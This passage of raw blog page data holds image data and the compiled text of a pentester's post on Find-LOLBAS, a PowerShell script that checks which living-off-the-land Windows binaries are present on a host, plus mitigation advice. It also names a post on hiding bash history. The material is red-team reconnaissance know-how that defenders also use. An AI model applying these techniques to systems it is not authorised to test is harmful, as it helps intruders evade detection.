BBAEFAAAAAAAAAAAAAAERAAISITEiEEFRYZH/2gAIAQEABj8COjxepVcMgMGO4fI7ddgYVshZEXHHuEVErxCun//EABoQAQADAQEBAAAAAAAAAAAAAAEAESFBMYH/2gAIAQEAAT8hzj4tUjD9gYdIXN85g0KSgowPEOwYUVrAXL8YMtkQjq8jwT//2gAMAwEAAgADAAAAEBzwQ//EABcRAAMBAAAAAAAAAAAAAAAAAAABERD/2gAIAQMBAT8QrLr/xAAYEQACAwAAAAAAAAAAAAAAAAAAARBRYf/aAAgBAgEBPxBJRnP/xAAcEAEBAAMBAQEBAAAAAAAAAAABEQAhMVFBYZH/2gAIAQEAAT8QJDLKyXzr+ZPm8xAHacZh+qtNcU9/MMGEsIFvh9MnhHQo6Ufjf5ho2mAq7gTeIsndARJzHxEDnilxrE1LvP/Z","aspectRatio":1,"src":"/static/bbc5a0350725e4142bf5961aa8b10636/fa1ea/avatar.jpg","srcSet":"/static/bbc5a0350725e4142bf5961aa8b10636/afb2b/avatar.jpg 13w,\n/static/bbc5a0350725e4142bf5961aa8b10636/7c20e/avatar.jpg 25w,\n/static/bbc5a0350725e4142bf5961aa8b10636/fa1ea/avatar.jpg 50w,\n/static/bbc5a0350725e4142bf5961aa8b10636/03612/avatar.jpg 75w,\n/static/bbc5a0350725e4142bf5961aa8b10636/61cdf/avatar.jpg 100w,\n/static/bbc5a0350725e4142bf5961aa8b10636/3bf7d/avatar.jpg 640w","srcWebp":"/static/bbc5a0350725e4142bf5961aa8b10636/e7b2c/avatar.webp","srcSetWebp":"/static/bbc5a0350725e4142bf5961aa8b10636/58718/avatar.webp 13w,\n/static/bbc5a0350725e4142bf5961aa8b10636/74aad/avatar.webp 25w,\n/static/bbc5a0350725e4142bf5961aa8b10636/e7b2c/avatar.webp 50w,\n/static/bbc5a0350725e4142bf5961aa8b10636/ed320/avatar.webp 75w,\n/static/bbc5a0350725e4142bf5961aa8b10636/66016/avatar.webp 100w,\n/static/bbc5a0350725e4142bf5961aa8b10636/f461a/avatar.webp 640w","sizes":"(max-width: 50px) 100vw, 50px"},"medium":{"base64":"data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAUABQDASIAAhEBAxEB/8QAGAABAQEBAQAAAAAAAAAAAAAAAAMEAgb/xAAWAQEBAQAAAAAAAAAAAAAAAAAAAQL/2gAMAwEAAhADEAAAAdMb8Zs0RTWannQf/8QAGhAAAgMBAQAAAAAAAAAAAAAAAQIAAxIEMf/aAAgBAQABBQIs4lVrmsWswKvBpi7KCo3Z1nPP5P/EABYRAAMAAAAAAAAAAAAAAAAAAAAQIf/aAAgBAwEBPwEr/8QAFxEAAwEAAAAAAAAAAAAAAAAAAAEREP/aAAgBAgEBPwGEW//EACAQAAIBBAEFAAAAAAAAAAAAAAERAAISITEiEEFRYZH/2gAIAQEABj8COjxepVcMgMGO4fI7ddgYVshZEXHHuEVErxCun//EABoQAQADAQEBAAAAAAAAAAAAAAEAESFBMYH/2gAIAQEAAT8hzj4tUjD9gYdIXN85g0KSgowPEOwYUVrAXL8YMtkQjq8jwT//2gAMAwEAAgADAAAAEBzwQ//EABcRAAMBAAAAAAAAAAAAAAAAAAABERD/2gAIAQMBAT8QrLr/xAAYEQACAwAAAAAAAAAAAAAAAAAAARBRYf/aAAgBAgEBPxBJRnP/xAAcEAEBAAMBAQEBAAAAAAAAAAABEQAhMVFBYZH/2gAIAQEAAT8QJDLKyXzr+ZPm8xAHacZh+qtNcU9/MMGEsIFvh9MnhHQo6Ufjf5ho2mAq7gTeIsndARJzHxEDnilxrE1LvP/Z","aspectRatio":1,"src":"/static/bbc5a0350725e4142bf5961aa8b10636/61cdf/avatar.jpg","srcSet":"/static/bbc5a0350725e4142bf5961aa8b10636/7c20e/avatar.jpg 25w,\n/static/bbc5a0350725e4142bf5961aa8b10636/fa1ea/avatar.jpg 50w,\n/static/bbc5a0350725e4142bf5961aa8b10636/61cdf/avatar.jpg 100w,\n/static/bbc5a0350725e4142bf5961aa8b10636/59538/avatar.jpg 150w,\n/static/bbc5a0350725e4142bf5961aa8b10636/fd013/avatar.jpg 200w,\n/static/bbc5a0350725e4142bf5961aa8b10636/3bf7d/avatar.jpg 640w","srcWebp":"/static/bbc5a0350725e4142bf5961aa8b10636/66016/avatar.webp","srcSetWebp":"/static/bbc5a0350725e4142bf5961aa8b10636/74aad/avatar.webp 25w,\n/static/bbc5a0350725e4142bf5961aa8b10636/e7b2c/avatar.webp 50w,\n/static/bbc5a0350725e4142bf5961aa8b10636/66016/avatar.webp 100w,\n/static/bbc5a0350725e4142bf5961aa8b10636/d9b14/avatar.webp 150w,\n/static/bbc5a0350725e4142bf5961aa8b10636/6b183/avatar.webp 200w,\n/static/bbc5a0350725e4142bf5961aa8b10636/f461a/avatar.webp 640w","sizes":"(max-width: 100px) 100vw, 100px"},"large":{"base64":"data:image/jpeg;base64,/9j/2wBDABALDA4MChAODQ4SERATGCgaGBYWGDEjJR0oOjM9PDkzODdASFxOQERXRTc4UG1RV19iZ2hnPk1xeXBkeFxlZ2P/2wBDARESEhgVGC8aGi9jQjhCY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2P/wgARCAAUABQDASIAAhEBAxEB/8QAGAABAQEBAQAAAAAAAAAAAAAAAAMEAgb/xAAWAQEBAQAAAAAAAAAAAAAAAAAAAQL/2gAMAwEAAhADEAAAAdMb8Zs0RTWannQf/8QAGhAAAgMBAQAAAAAAAAAAAAAAAQIAAxIEMf/aAAgBAQABBQIs4lVrmsWswKvBpi7KCo3Z1nPP5P/EABYRAAMAAAAAAAAAAAAAAAAAAAAQIf/aAAgBAwEBPwEr/8QAFxEAAwEAAAAAAAAAAAAAAAAAAAEREP/aAAgBAgEBPwGEW//EACAQAAIBBAEFAAAAAAAAAAAAAAERAAISITEiEEFRYZH/2gAIAQEABj8COjxepVcMgMGO4fI7ddgYVshZEXHHuEVErxCun//EABoQAQADAQEBAAAAAAAAAAAAAAEAESFBMYH/2gAIAQEAAT8hzj4tUjD9gYdIXN85g0KSgowPEOwYUVrAXL8YMtkQjq8jwT//2gAMAwEAAgADAAAAEBzwQ//EABcRAAMBAAAAAAAAAAAAAAAAAAABERD/2gAIAQMBAT8QrLr/xAAYEQACAwAAAAAAAAAAAAAAAAAAARBRYf/aAAgBAgEBPxBJRnP/xAAcEAEBAAMBAQEBAAAAAAAAAAABEQAhMVFBYZH/2gAIAQEAAT8QJDLKyXzr+ZPm8xAHacZh+qtNcU9/MMGEsIFvh9MnhHQo6Ufjf5ho2mAq7gTeIsndARJzHxEDnilxrE1LvP/Z","aspectRatio":1,"src":"/static/bbc5a0350725e4142bf5961aa8b10636/ec46e/avatar.jpg","srcSet":"/static/bbc5a0350725e4142bf5961aa8b10636/a2637/avatar.jpg 82w,\n/static/bbc5a0350725e4142bf5961aa8b10636/15203/avatar.jpg 164w,\n/static/bbc5a0350725e4142bf5961aa8b10636/ec46e/avatar.jpg 328w,\n/static/bbc5a0350725e4142bf5961aa8b10636/b69a5/avatar.jpg 492w,\n/static/bbc5a0350725e4142bf5961aa8b10636/3bf7d/avatar.jpg 640w","srcWebp":"/static/bbc5a0350725e4142bf5961aa8b10636/5a48e/avatar.webp","srcSetWebp":"/static/bbc5a0350725e4142bf5961aa8b10636/2d087/avatar.webp 82w,\n/static/bbc5a0350725e4142bf5961aa8b10636/29d87/avatar.webp 164w,\n/static/bbc5a0350725e4142bf5961aa8b10636/5a48e/avatar.webp 328w,\n/static/bbc5a0350725e4142bf5961aa8b10636/42f2e/avatar.webp 492w,\n/static/bbc5a0350725e4142bf5961aa8b10636/f461a/avatar.webp 640w","sizes":"(max-width: 328px) 100vw, 328px"}}}],"basePath":"/","slug":"/Hiding-Your-Tracks:-Bash-History","id":"e5e132e2-60a8-51f3-837e-608f4c23bc5a","title":"Hiding Your Tracks: Bash History","mailchimp":false,"next":[{"id":"32c98cab-0f66-51d2-9c73-c188b1e2bd8d","slug":"/The-Hunt-for-LOLBAS","secret":false,"title":"The Hunt for LOLBAS","author":"NotoriousRebel","date":"July 13th, 2019","dateForSEO":"2019-07-13T00:00:00.000Z","timeToRead":2,"excerpt":"Using Powershell to Hunt for LOLBAS","subscription":true,"body":"function _extends() { _extends = Object.assign || function (target) { for (var i = 1; i < arguments.length; i++) { var source = arguments[i]; for (var key in source) { if (Object.prototype.hasOwnProperty.call(source, key)) { target[key] = source[key]; } } } return target; }; return _extends.apply(this, arguments); }\n\nfunction _objectWithoutProperties(source, excluded) { if (source == null) return {}; var target = _objectWithoutPropertiesLoose(source, excluded); var key, i; if (Object.getOwnPropertySymbols) { var sourceSymbolKeys = Object.getOwnPropertySymbols(source); for (i = 0; i < sourceSymbolKeys.length; i++) { key = sourceSymbolKeys[i]; if (excluded.indexOf(key) >= 0) continue; if (!Object.prototype.propertyIsEnumerable.call(source, key)) continue; target[key] = source[key]; } } return target; }\n\nfunction _objectWithoutPropertiesLoose(source, excluded) { if (source == null) return {}; var target = {}; var sourceKeys = Object.keys(source); var key, i; for (i = 0; i < sourceKeys.length; i++) { key = sourceKeys[i]; if (excluded.indexOf(key) >= 0) continue; target[key] = source[key]; } return target; }\n\n/* @jsx mdx */\nvar _frontmatter = {\n  \"title\": \"The Hunt for LOLBAS\",\n  \"author\": \"NotoriousRebel\",\n  \"date\": \"2019-07-13T00:00:00.000Z\",\n  \"hero\": \"./images/hunt_lolbas_logo.png\",\n  \"excerpt\": \"Using Powershell to Hunt for LOLBAS\"\n};\n\nvar makeShortcode = function makeShortcode(name) {\n  return function MDXDefaultShortcode(props) {\n    console.warn(\"Component \" + name + \" was not imported, exported, or provided by MDXProvider as global scope\");\n    return mdx(\"div\", props);\n  };\n};\n\nvar layoutProps = {\n  _frontmatter: _frontmatter\n};\nvar MDXLayout = \"wrapper\";\nreturn function MDXContent(_ref) {\n  var components = _ref.components,\n      props = _objectWithoutProperties(_ref, [\"components\"]);\n\n  return mdx(MDXLayout, _extends({}, layoutProps, props, {\n    components: components,\n    mdxType: \"MDXLayout\"\n  }), mdx(\"h1\", {\n    \"id\": \"hunting-for-lolbas\"\n  }, \"Hunting for LOLBAS\"), mdx(\"h3\", {\n    \"id\": \"introduction\"\n  }, \"Introduction\"), mdx(\"p\", null, \"Like many pentesters I am a big fan of the \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/LOLBAS-Project/LOLBAS\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"LOLBAS\"), \" project.\\nand even recently contributed to \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/LOLBAS-Project/LOLBAS/pull/40\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"it\"), \". Although, the project is\\nincredibly useful I couldn\\u2019t find a tool that automated the process\\nof finding them so I decided to make one.\\nThen again how useful are they for redteamers? The answer is incredibly useful.\\nA recent attack dubbed \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://www.microsoft.com/security/blog/2019/07/08/dismantling-a-fileless-campaign-microsoft-defender-atp-next-gen-protection-exposes-astaroth-attack/\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"Astaroth\"), \" utilized LOLBAS for every step of the attack\\nafter initial compromise. \"), mdx(\"p\", null, \"With a goal in mind, I turned to Powershell.\"), mdx(\"h3\", {\n    \"id\": \"understanding-lolbas\"\n  }, \"Understanding LOLBAS\"), mdx(\"p\", null, \"Before automating the hunt for LOLBAS it\\u2019s important to understand\\nwhat they are. LOLBAS stands for living off the land binaries and scripts,\\na simple example, as leveraged in my last post is regsvr32. A seemingly\\ninconspicuous executable being used for code execution. Binaries and scripts\\nthat can be used in creative ways that benefit blueteam and redteam. Blueteam\\nas it can show possible attack vectors that should be monitored and understood.\\nRedteam as utilizing these possible attack vectors if present, may be less likely\\nnoticed and being run by a trusted source.\"), mdx(\"h3\", {\n    \"id\": \"python---powershell\"\n  }, \"Python -> Powershell\"), mdx(\"p\", null, \"With Linux being taken care of by \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://gtfobins.github.io/\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"GTFOBins\"), \"\\nWindows was next.\\nOne of the biggest obstacles is that compared to GTFOBins,\\nLOLBAS is over quadruple the size. Using Python and Bash to quickly\\naccumulate the files and output the information into an easy way\\nto copy and paste is great. \"), mdx(\"p\", null, mdx(\"span\", _extends({\n    parentName: \"p\"\n  }, {\n    \"className\": \"gatsby-resp-image-wrapper\",\n    \"style\": {\n      \"position\": \"relative\",\n      \"display\": \"block\",\n      \"marginLeft\": \"auto\",\n      \"marginRight\": \"auto\",\n      \"maxWidth\": \"871px\"\n    }\n  }), \"\\n      \", mdx(\"span\", _extends({\n    parentName: \"span\"\n  }, {\n    \"className\": \"gatsby-resp-image-background-image\",\n    \"style\": {\n      \"paddingBottom\": \"102.18140068886336%\",\n      \"position\": \"relative\",\n      \"bottom\": \"0\",\n      \"left\": \"0\",\n      \"backgroundImage\": \"url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAABJ0AAASdAHeZh94AAACLklEQVQ4y51U27KcIBAEFAQRUVBX18u6l1TykPz/53VG91ySVJ3K8Tx0MVDaMN0zw5qWIUaPy2XF7X7HOq1w2kHnGkIIMMaOwftnUFUe09zj+/oN1+GGNrSQaXqcsKqfgTE52lbC1wpOeViRHyfbUJYMSaLhnEZuGaxVyIxGIhIoSbHKwBnfkSYpMp3BZGaPZSp3WaSUMNogkxnYqWdQKkXlDVyaEUrUrkbIa9R1CVc4CCZ2KKVQOAdf+P3nV2JjDKqyQmEKsJZMKb3FeO7RSY/WNlBcEcH2oi+kXL9oqDKGrm8RYsBlvZCeHd1a07k6RhjC+6b0Fcahx0KkXekRQiB9k2OEW8p7wJ9rmjI0MUUXI0xhdrEDCyhF+fbNp1J+hRAc57HG/XFDp0/IhXlz+VBh85fbrS2wLCuapiGTerSshZb6QGFX/75QIBLZOI6YhhPGeYT3fu8aQXpu9cmPEHLOofVW6A49Ob25ba3dsREHFyAT+TFh0/x9sFX/OE6Ypgnr7YorIbekY0Iaik+k/Eq4ubvpKE2Gx487hr7HXM5Y44o5LrgGWt0MyywiiyhYASnkx4R5znC6UrfMC+ZhxMlRx7CMoKCZRkaxZHJvwfRl/U/KHOudRld/x8/yFx7uga7osHQLhuoMkxgI/on52LXvm35wNBNr9OeBnI40dehVSh7rlJ6mTVXn5F6FKB2iLiklmiBkjlT8a8Mhpbm3tdp9ueJ8mvZ2438U+xH8Bn1grZxfIP4rAAAAAElFTkSuQmCC')\",\n      \"backgroundSize\": \"cover\",\n      \"display\": \"block\"\n    }\n  })), \"\\n  \", mdx(\"picture\", {\n    parentName: \"span\"\n  }, \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/cbef4edc206c107701526fd4c63ef865/e9904/automate.webp 871w\"],\n    \"sizes\": \"(max-width: 871px) 100vw, 871px\",\n    \"type\": \"image/webp\"\n  })), \"\\n        \", mdx(\"source\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"srcSet\": [\"/static/cbef4edc206c107701526fd4c63ef865/62d82/automate.png 871w\"],\n    \"sizes\": \"(max-width: 871px) 100vw, 871px\",\n    \"type\": \"image/png\"\n  })), \"\\n        \", mdx(\"img\", _extends({\n    parentName: \"picture\"\n  }, {\n    \"className\": \"gatsby-resp-image-image\",\n    \"src\": \"/static/cbef4edc206c107701526fd4c63ef865/62d82/automate.png\",\n    \"alt\": \"Automate\",\n    \"title\": \"Automate\",\n    \"loading\": \"lazy\",\n    \"style\": {\n      \"width\": \"100%\",\n      \"height\": \"100%\",\n      \"margin\": \"0\",\n      \"verticalAlign\": \"middle\",\n      \"position\": \"absolute\",\n      \"top\": \"0\",\n      \"left\": \"0\"\n    }\n  })), \"\\n      \"), \"\\n    \")), mdx(\"h5\", {\n    \"id\": \"automating-the-extraction-of-important-information-from-each-file\"\n  }, \"Automating the extraction of important information from each file\"), mdx(\"h3\", {\n    \"id\": \"checking-the-paths-in-powershell\"\n  }, \"Checking the Paths in Powershell\"), mdx(\"p\", null, \"Organizing the information in Powershell was simple,\\nusing a hash table. The key being the filepath mapped to\\nan array of the Binary or Script name and an example command\\nutilizing it. For example:\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"'C:\\\\Windows\\\\explorer.exe' = 'Explorer.exe', 'explorer.exe calc.exe';\\n\")), mdx(\"p\", null, \"Path on the left, mapped to the name of the Binary or Script\\nand an example command utilizing it. \"), mdx(\"p\", null, \"After creating the hash table the rest is a piece of cake.\"), mdx(\"pre\", null, mdx(\"code\", _extends({\n    parentName: \"pre\"\n  }, {\n    \"className\": \"language-powershell\"\n  }), \"foreach($path in $dict.Keys){\\n   Try\\n    {         \\n      if(Test-Path -Path $path){\\n         $paths += $path\\n      }\\n    }\\n    Catch {\\n      Write-Host \\\"An error occurred:\\\"\\n      Write-Host $_\\n    }\\n }\\n\")), mdx(\"p\", null, \" Just iterate through the keys in the hash table and check\\nif the path exists if it does add it to an array. Then at the\\nend iterate through the array and pretty print it.\\nTbe script\\u2019s name was an obvious choice:\\n\", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/NotoriousRebel/Find-LOLBAS\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"Find-LOLBAS\"), \".\"), mdx(\"h3\", {\n    \"id\": \"whats-next\"\n  }, \"What\\u2019s Next?\"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Staying up to date with new LOLBAS additions\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Adding different ways to run the script such as through C# in Powershell\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Look into obfuscating payload with Crypt32.dll\"))), mdx(\"h3\", {\n    \"id\": \"mitigation\"\n  }, \"Mitigation\"), mdx(\"ul\", null, mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Adhering to proper block rules such as\\n\", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/microsoft-recommended-block-rules\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"Microsoft recommended block rules\"), \"\\nand utilizing things such as Applocker and Software Restriction Policies \")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Being cognisant of normal network traffic in and out of your system/s is also crucial\\nas becoming familiar with daily traffic can make it very easy to spot when something is\\nout of the ordinary\")), mdx(\"li\", {\n    parentName: \"ul\"\n  }, mdx(\"p\", {\n    parentName: \"li\"\n  }, \"Understanding the foundation of each LOLBAS is also important,\\nknowing how each one is meant to be used will make it easier to spot when it is\\nused for malicious purposes. \"))), mdx(\"p\", null, \"Overall awareness is necessary as well, knowing how a LOLBAS should be used\\nis key. For example, if you\\u2019ve never used regsvr32 before and find it calling out to the internet\\nthat should set off an alarm! \"), mdx(\"h3\", {\n    \"id\": \"acknowledgements\"\n  }, \"Acknowledgements\"), mdx(\"p\", null, \"This script wouldn\\u2019t have been possible without the amazing people\\nwho work on \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/LOLBAS-Project/LOLBAS\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"LOLBAS\"), \".\"), mdx(\"p\", null, \"Special thanks to \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://twitter.com/bohops\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"@Bohops\"), \"\\nfor inspiration and \", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://twitter.com/Oddvarmoe\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"@Oddvarmoe\"), \"\\nfor the consistent work and maintenance on the\\n\", mdx(\"a\", _extends({\n    parentName: \"p\"\n  }, {\n    \"href\": \"https://github.com/LOLBAS-Project/LOLBAS\",\n    \"target\": \"_blank\",\n    \"rel\": \"noreferrer\"\n  }), \"LOLBAS\"), \" project.\"));\n}\n;\nMDXContent.isMDXComponent = true;","hero":{"full":{"base64":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAAAsSAAALEgHS3X78AAADcElEQVQ4y41Ua0xURxQeaVqTNrFN2hhNTGr40VRaAsHYH9b6iCGFJU1DIaRJHxqDMeIjkkIfUB7amlat/UGgTVotDWBsQkt84CO4VndBZHmn5aFV1gZBVpBl2S4scmfm65m798KAJDrJl3Pu3HO+e+bOOR8DwNSSUjLyn9L8ZMJP5P9F1k8IEHoJlYR0wjMqlmyUzqGTLbICNhFa8PjVQ3jPypnJtx+iLH+flsAJBkEQpAVh7XEt7jCzllmpfUyye7Ugg6qWGtFC4BrxEYsjUiXnfINZEucKQlkhhJmoeCPckRV5jGyQEQRu+e8zrVSPXZmdp6CIreAZUmUNYUJa1gwi2zc5zZ9VZIlqo+rXcpGRkSGTHCmy+Mt86fMNmQRUaYTQtI9cjJxXyBbGhSjJyd6HF2MSjPTC72RO+R8yPu1jxMbH40Zv77x0gWCY42KPH9UdIzjXNap8Wds1anjuCYyHjRqWl/tJ0ysbk3DVN8Gb2zvoHNOYoty3swuR4kg2eUKhEPxj46Z/stUHtseNz894wXa7wHZckSzzT77yq07cDz7sZq/GvDZw4GQtHtD3v7kZkqXHytHTVI+2gIEVcW+gzXMdBUWFyNpDTfDwPxRf6AfLvIzPTnvxQ/0gXvi0EWyXS6Yev6G+N8yWvhw9VHWtEz3DAflLu1ee6Avgd7cHPvory9ash9tZh7yCAuzMykJwfAzv/twLttWJl764jtb+INZ+3wm27bI8eGlQEY6w1XGxLRlFRzFN/7/+Yq084u7GBL053tCJ6NfjEAyMITQxiYB/1Ozq5fmNcPz4N1y3Asg/ewcJh9slVSictycVYTc7UVlRtvrNt5BTdda4S8eua2qVJZc8iEtOxcH9RZGREZHLvPKPH4uzG0yiVV+3ILumD7mnvHJJ7jXDN2WGnFJtk9TgdiEpJYWvS/9QJmbulesd7+DooW9nZ5AL0w4EpvBb2zDKm3yo8BCaffJY4xDULVuh2+3GblFNdtVZZzgvnEf/v3fk7GTIOXaBHrTH7y71+vMmYTgc3qwFCauh5XyyBaZEWcN6t8WWLlNpiCDPmmdyhaGRLCQMuhqpVTYjDrqWkc3XFUeTKmGBa/v2Kp0jX5om2r6D0PUEAuslfGCT0UEWzWGdJ7RPE9IsuVfq3U9QndtOqCZ8RHjOPqbO8T+4HPK2YHw2SwAAAABJRU5ErkJggg==","aspectRatio":1,"src":"/static/e6f5e62a79cd7704687fe00638df8551/e0259/hunt_lolbas_logo.png","srcSet":"/static/e6f5e62a79cd7704687fe00638df8551/5b37e/hunt_lolbas_logo.png 236w,\n/static/e6f5e62a79cd7704687fe00638df8551/49058/hunt_lolbas_logo.png 472w,\n/static/e6f5e62a79cd7704687fe00638df8551/e0259/hunt_lolbas_logo.png 749w","srcWebp":"/static/e6f5e62a79cd7704687fe00638df8551/d8dc1/hunt_lolbas_logo.webp","srcSetWebp":"/static/e6f5e62a79cd7704687fe00638df8551/77392/hunt_lolbas_logo.webp 236w,\n/static/e6f5e62a79cd7704687fe00638df8551/1f177/hunt_lolbas_logo.webp 472w,\n/static/e6f5e62a79cd7704687fe00638df8551/d8dc1/hunt_lolbas_logo.webp 749w","sizes":"(max-width: 749px) 100vw, 749px"},"regular":{"base64":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAAAsSAAALEgHS3X78AAADcElEQVQ4y41Ua0xURxQeaVqTNrFN2hhNTGr40VRaAsHYH9b6iCGFJU1DIaRJHxqDMeIjkkIfUB7amlat/UGgTVotDWBsQkt84CO4VndBZHmn5aFV1gZBVpBl2S4scmfm65m798KAJDrJl3Pu3HO+e+bOOR8DwNSSUjLyn9L8ZMJP5P9F1k8IEHoJlYR0wjMqlmyUzqGTLbICNhFa8PjVQ3jPypnJtx+iLH+flsAJBkEQpAVh7XEt7jCzllmpfUyye7Ugg6qWGtFC4BrxEYsjUiXnfINZEucKQlkhhJmoeCPckRV5jGyQEQRu+e8zrVSPXZmdp6CIreAZUmUNYUJa1gwi2zc5zZ9VZIlqo+rXcpGRkSGTHCmy+Mt86fMNmQRUaYTQtI9cjJxXyBbGhSjJyd6HF2MSjPTC72RO+R8yPu1jxMbH40Zv77x0gWCY42KPH9UdIzjXNap8Wds1anjuCYyHjRqWl/tJ0ysbk3DVN8Gb2zvoHNOYoty3swuR4kg2eUKhEPxj46Z/stUHtseNz894wXa7wHZckSzzT77yq07cDz7sZq/GvDZw4GQtHtD3v7kZkqXHytHTVI+2gIEVcW+gzXMdBUWFyNpDTfDwPxRf6AfLvIzPTnvxQ/0gXvi0EWyXS6Yev6G+N8yWvhw9VHWtEz3DAflLu1ee6Avgd7cHPvory9ash9tZh7yCAuzMykJwfAzv/twLttWJl764jtb+INZ+3wm27bI8eGlQEY6w1XGxLRlFRzFN/7/+Yq084u7GBL053tCJ6NfjEAyMITQxiYB/1Ozq5fmNcPz4N1y3Asg/ewcJh9slVSictycVYTc7UVlRtvrNt5BTdda4S8eua2qVJZc8iEtOxcH9RZGREZHLvPKPH4uzG0yiVV+3ILumD7mnvHJJ7jXDN2WGnFJtk9TgdiEpJYWvS/9QJmbulesd7+DooW9nZ5AL0w4EpvBb2zDKm3yo8BCaffJY4xDULVuh2+3GblFNdtVZZzgvnEf/v3fk7GTIOXaBHrTH7y71+vMmYTgc3qwFCauh5XyyBaZEWcN6t8WWLlNpiCDPmmdyhaGRLCQMuhqpVTYjDrqWkc3XFUeTKmGBa/v2Kp0jX5om2r6D0PUEAuslfGCT0UEWzWGdJ7RPE9IsuVfq3U9QndtOqCZ8RHjOPqbO8T+4HPK2YHw2SwAAAABJRU5ErkJggg==","aspectRatio":1,"src":"/static/e6f5e62a79cd7704687fe00638df8551/3ddd4/hunt_lolbas_logo.png","srcSet":"/static/e6f5e62a79cd7704687fe00638df8551/078a8/hunt_lolbas_logo.png 163w,\n/static/e6f5e62a79cd7704687fe00638df8551/e56da/hunt_lolbas_logo.png 327w,\n/static/e6f5e62a79cd7704687fe00638df8551/3ddd4/hunt_lolbas_logo.png 653w,\n/static/e6f5e62a79cd7704687fe00638df8551/e0259/hunt_lolbas_logo.png 749w","srcWebp":"/static/e6f5e62a79cd7704687fe00638df8551/0acdf/hunt_lolbas_logo.webp","srcSetWebp":"/static/e6f5e62a79cd7704687fe00638df8551/ac59e/hunt_lolbas_logo.webp 163w,\n/static/e6f5e62a79cd7704687fe00638df8551/7660b/hunt_lolbas_logo.webp 327w,\n/static/e6f5e62a79cd7704687fe00638df8551/0acdf/hunt_lolbas_logo.webp 653w,\n/static/e6f5e62a79cd7704687fe00638df8551/d8dc1/hunt_lolbas_logo.webp 749w","sizes":"(max-width: 653px) 100vw, 653px"},"narrow":{"base64":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUCAYAAACNiR0NAAAACXBIWXMAAAsSAAALEgHS3X78AAADcElEQVQ4y41Ua0xURxQeaVqTNrFN2hhNTGr40VRaAsHYH9b6iCGFJU1DIaRJHxqDMeIjkkIfUB7amlat/UGgTVotDWBsQkt84CO4VndBZHmn5aFV1gZBVpBl2S4scmfm65m798KAJDrJl3Pu3HO+e+bOOR8DwNSSUjLyn9L8ZMJP5P9F1k8IEHoJlYR0wjMqlmyUzqGTLbICNhFa8PjVQ3jPypnJtx+iLH+flsAJBkEQpAVh7XEt7jCzllmpfUyye7Ugg6qWGtFC4BrxEYsjUiXnfINZEucKQlkhhJmoeCPckRV5jGyQEQRu+e8zrVSPXZmdp6CIreAZUmUNYUJa1gwi2zc5zZ9VZIlqo+rXcpGRkSGTHCmy+Mt86fMNmQRUaYTQtI9cjJxXyBbGhSjJyd6HF2MSjPTC72RO+R8yPu1jxMbH40Zv77x0gWCY42KPH9UdIzjXNap8Wds1anjuCYyHjRqWl/tJ0ysbk3DVN8Gb2zvoHNOYoty3swuR4kg2eUKhEPxj46Z/stUHtseNz894wXa7wHZckSzzT77yq07cDz7sZq/GvDZw4GQtHtD3v7kZkqXHytHTVI+2gIEVcW+gzXMdBUWFyNpDTfDwPxRf6AfLvIzPTnvxQ/0gXvi0EWyXS6Yev6G+N8yWvhw9VHWtEz3DAflLu1ee6Avgd7cHPvory9ash9tZh7yCAuzMykJwfAzv/twLttWJl764jtb+INZ+3wm27bI8eGlQEY6w1XGxLRlFRzFN/7/+Yq084u7GBL053tCJ6NfjEAyMITQxiYB/1Ozq5fmNcPz4N1y3Asg/ewcJh9slVSictycVYTc7UVlRtv